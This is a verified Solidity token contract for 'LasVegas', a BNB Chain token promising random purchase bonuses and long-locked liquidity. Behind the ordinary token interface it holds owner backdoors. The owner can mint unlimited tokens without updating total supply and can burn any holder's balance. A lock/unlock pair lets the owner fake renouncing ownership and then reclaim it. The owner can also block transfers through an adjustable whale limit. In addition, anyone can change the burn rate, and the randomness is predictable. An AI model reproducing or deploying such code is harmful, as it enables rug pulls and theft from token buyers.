/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

/**
     Las Vegas is a community token made to satisfy your addictions!

Try your $LasVegas luck
With every transaction there is a chance to receive bonus $LasVegas:
15%: Receive 35% more $LasVegas
5%: Receive 2x the amount of $LasVegas
1%: Receive 3x the amount of $LasVegas

Liquidity
100% of the liquidity was locked for 100 years.

     */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * This function can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

     /**
     * @dev Locks the contract by the current owner for the amount of time provided (In seconds)
     */
    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
     /**
     * @dev Unlocks the contract.  Can only be called by the owner that locked the contract and only after the lock time has passed
     */
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You do not have permission to unlock");
        require( block.timestamp > _lockTime, "Contract is locked");

        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}


contract NoWhalesPlease is Ownable { 
    uint256 private _limitAmount;
    bool private _enabled;

    function getLimitEnabled() public view returns (bool) {
        return _enabled;
    }

    function setLimitEnabled(bool enabled) public onlyOwner {
        _enabled = enabled;
    }

    function getLimitAmount() public view returns (uint256) {
        return _limitAmount;
    }

    function setLimitAmount(uint256 amount) public onlyOwner {
        _limitAmount = amount;
    }

    function isNotWhale(uint256 amount) public view returns (bool) {
        if (msg.sender == owner()) {
            return true;
        }
        
        if (!_enabled) {
            return true;
        }
        
        return amount <= _limitAmount;
    }
}



contract LasVegas is Context, IERC20Metadata, Ownable, NoWhalesPlease {
    string private constant _name = "LasVegas";
    string private constant _symbol = "LasVegas";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply =  1000000000000000 * 10**_decimals;
    uint256 private _burnPercentage = 9;
    uint private _nonce = 0;
    bool private _rewardsEnabled = true;
    
    
    uint256 private _totalRewards = 0;
    
    mapping (address => uint256) private _rewards; // Holds total rewards by address
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _burnAddress;

    constructor (address burnAddress) {
        _burnAddress = burnAddress;
        mint(_msgSender(), _totalSupply);
    }

    function name() public pure override returns (string memory) {
        return _name;
    }

    function symbol() public pure override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function burn(address account, uint256 amount) public onlyOwner {
        _transfer(account, _burnAddress, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }
    
    function mint(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "Mint to the zero address is not allowed");
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Cannot transfer from the zero address");
        require(sender != _burnAddress, "Cannot  transfer from the burn address");
        require(isNotWhale(amount), "Whales not allowed");
        
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Not enough balance");
        
        // Calculate burn amount
        uint256 burnAmount = _calculateBurnAmount(amount);
        
        // Calculate any reward
        uint256 rewardAmount = _calculateRewardAmount(sender, amount);
        
        // Calculate total amount received by recipient
        uint256 totalReceived = amount - burnAmount + rewardAmount;
        
        // Update the balances
        _balances[sender] -= amount;
        _balances[recipient] += totalReceived;
        _balances[_burnAddress] += burnAmount;
        
        // Rewards are taken from burn address
        _balances[_burnAddress] -= rewardAmount;
        
        // Update total rewards for tracking purposes
        _totalRewards += rewardAmount;
        _rewards[recipient] += rewardAmount;
        
        
        // In the event we show the final amount received by recipient
        emit Transfer(sender, recipient, totalReceived);
    }
    
    // Returns the total number of creamies won
    function getTotalRewards() public view returns(uint256) {
        return _totalRewards;
    }
    
    // Returns the total number of creamies won by the given address
    function getTotalRewards(address addr) public view returns(uint256) {
        return _rewards[addr];
    }
    
    function _calculateBurnAmount(uint256 amount) public view returns(uint256) {
        return amount * _burnPercentage / 100;
    }

    function getRewardsEnabled() public view returns(bool) {
        return _rewardsEnabled;   
    }
    
    function setRewardsEnabled(bool isEnabled) public onlyOwner {
        _rewardsEnabled = isEnabled;
    }
    
    function getBurnPercentage() public view returns(uint256) {
        return _burnPercentage;
    }
    
    function setBurnPercentage(uint256 percentage) public {
        _burnPercentage = percentage;
    }
    
    // Rolls the dice and returns the extra amount of tokens (In addition to the amount bought) that should be received 
    function _calculateRewardAmount(address sender, uint256 amount) private returns(uint256) {
        if (sender != address(this) || !_rewardsEnabled) {
            // Only reward when buying
            return 0;   
        }
        
        // Calculate random number from 0 to 100
        uint8 rand = _rand();
            
        // 1% chance for x3 reward
        if (rand < 1)
        {
            return amount * 2;
        }
            
        // 5% chance for x2 reward
        if (rand < 5)
        {
            return amount;
        }
        
        // 15% chance for x1.35 reward (35% extra)
        if (rand < 15)
        {
            return amount * 35 / 100;
        }
            
        return 0;
    }
    
	function _rand() private returns(uint8) {
		uint8 random = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender, block.gaslimit, _nonce))) % 100);
		 _nonce++;
		return random;
	}
	
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "Cannot approve from the zero address");
        require(spender != address(0), "Cannot approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "Cannot decrease allowance below zero");

        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
}